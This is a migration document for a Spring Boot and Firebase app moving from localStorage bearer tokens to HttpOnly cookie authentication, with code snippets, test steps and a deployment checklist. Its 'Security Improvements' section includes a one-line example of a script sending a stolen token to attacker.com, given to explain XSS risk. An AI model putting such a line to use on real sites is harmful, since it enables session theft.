# Migration to Cookie-Based Authentication

## Date: December 14, 2025

## Summary of Changes

This document outlines the migration from **header-based authentication** to **cookie-based authentication** for improved security.

---

## Why This Change?

### Security Risks of Header-Based Authentication (Old Approach)
- ❌ Tokens stored in `localStorage` are accessible to JavaScript
- ❌ Vulnerable to XSS (Cross-Site Scripting) attacks
- ❌ Tokens can be stolen by malicious scripts
- ❌ Manual header management increases error potential
- ❌ Tokens visible in network logs and browser dev tools

### Benefits of Cookie-Based Authentication (New Approach)
- ✅ **HttpOnly cookies** cannot be accessed by JavaScript
- ✅ **Protection against XSS attacks** - even if script is injected, it cannot steal the token
- ✅ **Automatic cookie management** by browser
- ✅ **Secure flag** for HTTPS-only transmission in production
- ✅ **SameSite attribute** for CSRF protection
- ✅ **Automatic expiration** managed by browser

---

## Files Modified

### Backend Changes

#### 1. FirebaseTokenFilter.java
**Location:** `src/main/java/com/org/stem_project/config/FirebaseTokenFilter.java`

**Changes:**
- ✅ Added cookie-based token extraction
- ✅ Commented out old header-based approach with explanations
- ✅ Added detailed comments explaining security benefits

**Old Code:**
```java
String header = request.getHeader("Authorization");
if (header != null && header.startsWith("Bearer ")) {
    String token = header.substring(7);
}
```

**New Code:**
```java
String token = null;
Cookie[] cookies = request.getCookies();
if (cookies != null) {
    for (Cookie cookie : cookies) {
        if ("authToken".equals(cookie.getName())) {
            token = cookie.getValue();
            break;
        }
    }
}
```

#### 2. AuthController.java
**Location:** `src/main/java/com/org/stem_project/controller/AuthController.java`

**New Endpoints Added:**
- ✅ `POST /api/auth/set-token` - Stores Firebase token in HttpOnly cookie
- ✅ `POST /api/auth/logout` - Clears authentication cookie

**Cookie Configuration:**
```java
Cookie authCookie = new Cookie("authToken", token);
authCookie.setHttpOnly(true);   // XSS protection
authCookie.setSecure(false);    // Set to true in production
authCookie.setPath("/");        // Available for entire app
authCookie.setMaxAge(3600);     // 1 hour expiry
```

#### 3. SecurityConfig.java
**Location:** `src/main/java/com/org/stem_project/config/SecurityConfig.java`

**Changes:**
- ✅ Updated to permit new auth endpoints (`/api/auth/**`)
- ✅ Added comment about CSRF protection for production

#### 4. CorsConfig.java
**Location:** `src/main/java/com/org/stem_project/config/CorsConfig.java`

**Status:** ✅ Already configured correctly with `allowCredentials(true)`

### Frontend Changes

#### 5. index.html
**Location:** `src/main/resources/static/index.html`

**Major Changes:**

**1. New Function: `storeTokenInCookie()`**
```javascript
async function storeTokenInCookie() {
    const token = await auth.currentUser.getIdToken(true);
    await fetch(`${API_BASE_URL}/auth/set-token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ token })
    });
}
```

**2. Updated `getAuthHeaders()` Function**
- ✅ Removed Authorization header creation
- ✅ Only returns Content-Type header
- ✅ Browser automatically includes cookies

**3. Updated All Fetch Requests**
- ✅ Added `credentials: 'include'` to all API calls
- ✅ Ensures cookies are sent with every request

**4. Updated `signInWithGoogle()` Function**
- ✅ Calls `storeTokenInCookie()` after Firebase login

**5. Updated `logout()` Function**
- ✅ Calls backend `/api/auth/logout` endpoint
- ✅ Clears cookie before signing out from Firebase

**6. Updated `onAuthStateChanged()` Listener**
- ✅ Refreshes token in cookie on auth state changes
- ✅ Handles page refresh scenarios

### Documentation Changes

#### 6. README.md
**Location:** `README.md`

**New Sections Added:**
- ✅ Cookie-Based Authentication Security (comprehensive explanation)
- ✅ Security Comparison Table (Headers vs Cookies)
- ✅ Migration Guide (step-by-step instructions)
- ✅ API Endpoints Documentation
- ✅ Updated Testing Examples
- ✅ Cookie-specific Troubleshooting
- ✅ Updated Authentication Flow Diagrams
- ✅ Best Practices for Cookie Security

---

## API Changes

### New Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/auth/set-token` | Store Firebase token in HttpOnly cookie |
| POST | `/api/auth/logout` | Clear authentication cookie |

### Modified Endpoints

All existing endpoints now expect authentication via cookies instead of Authorization headers:
- `/api/auth/check-user`
- `/api/auth/user`
- `/api/products` (all CRUD operations)

---

## Testing the Migration

### 1. Test Login Flow
```javascript
// 1. Login with Firebase
await signInWithPopup(auth, provider);

// 2. Check cookie is set (in browser DevTools > Application > Cookies)
// Look for: authToken cookie with HttpOnly flag

// 3. Test authenticated request
const response = await fetch('/api/auth/user', {
    credentials: 'include'
});
```

### 2. Test Logout Flow
```javascript
// Call logout
await fetch('/api/auth/logout', {
    method: 'POST',
    credentials: 'include'
});

// Verify cookie is cleared (check browser DevTools)
```

### 3. Test Protected Endpoints
```javascript
// Should work with cookie
const products = await fetch('/api/products', {
    credentials: 'include'
});

// Should fail without cookie (incognito or after logout)
```

---

## Security Improvements

### Before (Header-Based)
```javascript
// Token in localStorage - VULNERABLE
localStorage.setItem('authToken', token);

// Malicious script can steal it
const stolenToken = localStorage.getItem('authToken');
fetch('https://attacker.com/steal?token=' + stolenToken);
```

### After (Cookie-Based)
```javascript
// Token in HttpOnly cookie - PROTECTED
// JavaScript cannot access it

// Malicious script is blocked
document.cookie; // authToken is not accessible
// XSS attack is prevented!
```

---

## Deployment Checklist

### Development Environment ✅
- [x] HttpOnly flag enabled
- [x] Secure flag disabled (HTTP allowed)
- [x] SameSite not set (for localhost testing)
- [x] Cookie path set to `/`

### Production Environment (TODO when deploying)
- [ ] HttpOnly flag enabled
- [ ] Secure flag enabled (HTTPS only)
- [ ] SameSite set to "Strict" or "Lax"
- [ ] Configure CORS for production domain
- [ ] Enable CSRF protection in SecurityConfig
- [ ] Update cookie domain for production URL

---

## Breaking Changes

⚠️ **Important:** This is a breaking change for existing clients.

### What Breaks
- Old clients sending `Authorization: Bearer <token>` headers will NOT work
- Tokens stored in `localStorage` will be ignored
- API calls without `credentials: 'include'` will fail

### Migration Path for Existing Clients
1. Update frontend to call `/api/auth/set-token` after Firebase login
2. Add `credentials: 'include'` to all fetch requests
3. Remove Authorization header creation code
4. Remove localStorage token management

---

## Rollback Plan

If issues arise, you can temporarily support both authentication methods:

```java
// In FirebaseTokenFilter.java
String token = extractTokenFromCookie(request);

// Fallback to header for backwards compatibility
if (token == null) {
    String header = request.getHeader("Authorization");
    if (header != null && header.startsWith("Bearer ")) {
        token = header.substring(7);
    }
}
```

---

## Additional Notes

### Performance Impact
- ✅ Negligible - cookies are sent automatically (no extra overhead)
- ✅ Reduced JavaScript execution (no manual header creation)
- ✅ Browser handles cookie lifecycle efficiently

### Browser Compatibility
- ✅ All modern browsers support HttpOnly cookies
- ✅ Works in Chrome, Firefox, Safari, Edge
- ✅ Mobile browsers fully supported

### Known Limitations
- ⚠️ Cookies have size limits (4KB typically)
- ⚠️ JWT tokens are usually under 2KB, so no issue
- ⚠️ CSRF protection needed for production (recommended)

---

## Questions?

For questions or issues related to this migration, please refer to:
- `README.md` - Complete documentation
- Firebase Authentication docs
- Spring Security documentation
- OWASP Cookie Security guidelines

---

**Migration Completed:** December 14, 2025  
**Tested:** ✅ Yes (Development environment)  
**Production Ready:** ⚠️ Pending CSRF configuration

